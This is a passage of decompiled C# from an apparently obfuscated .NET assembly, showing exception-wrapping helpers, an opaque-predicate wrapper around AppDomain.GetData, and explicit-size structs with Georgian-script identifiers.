        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        System.Type o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static object ႣႳ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      try
      {
        switch ((obj3 ^ obj2) - 109)
        {
          case 0:
            return obj0.GetData(obj1);
          default:
            goto label_0;
        }
      }
      catch (Exception ex)
      {
        AppDomain o1 = obj0;
        string o2 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj3;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 2426, Pack = 1)]
    private struct ႥႨ
    {
    }

    [StructLayout(LayoutKind.Explicit, Size = 3022, Pack = 1)]
    private struct ႰႳ
    {
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct ႰႭ
    {
      internal byte[] Ⴄ;
      internal byte[] Ⴗ;
      internal int Ⴃ;
      internal int Ⴐ;
      internal int Ⴈ;
      internal int Ⴓ;
      internal int Ⴅ;
      internal int Ⴍ;
      internal byte Ⴀ;
      internal int Ⴜ;
    }
  }
}
